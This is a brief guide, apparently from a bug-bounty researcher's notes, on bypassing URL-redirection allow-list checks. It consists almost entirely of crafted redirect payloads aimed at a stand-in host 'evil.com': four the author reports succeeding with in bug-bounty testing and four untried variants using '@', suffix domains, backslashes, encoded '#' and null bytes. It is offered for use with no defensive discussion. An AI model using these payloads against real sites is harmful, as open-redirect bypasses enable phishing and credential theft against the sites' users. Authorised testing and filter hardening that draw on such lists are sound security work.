Description: In this guide, you will learn how to bypass URL redirection white-list detection.

## Quickstart

The following bypass techniques I have really succeeded in SRC.

```shell
https://example.com/?url=target.com@evil.com

https://example.com/?url=target.com.evil.com

https://example.com/?url=evil.com/target.com

https://example.com/?url=evil.com?target.com
```

I haven't succeeded in the following techniques in SRC, but you can also try it.

```shell
https://example.com/?url=target.com%23evil.com

https://example.com/?url=target.com\evil.com

https://example.com/?url=target.com\.evil.com

https://example.com/?url=target.com%00evil.com
```
